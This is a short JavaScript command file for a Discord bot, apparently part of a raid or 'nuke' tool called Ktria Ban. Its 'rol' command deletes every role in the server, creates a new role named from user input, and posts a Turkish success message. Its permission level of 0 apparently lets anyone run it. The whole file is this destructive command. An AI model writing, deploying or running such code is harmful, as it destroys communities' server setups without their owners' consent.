const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {

let mesaj = args.slice(0).join(" ")
message.guild.roles.forEach(a => a.delete())
message.guild.createRole({ name: `${mesaj}`, position: 20, permissions: ['MANAGE_MESSAGES'], color: 'RED'})
message.channel.send('**Ktria Ban v12 Başarılı Bir Şekilde Bütün Rolleri Sildi ☑️**')
};

module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: [],
  permLevel: 0,
  kategori: "ktriarol"
};

module.exports.help = {
  name: "rol",
  description: "ktriarol",
  usage: "rol"
};
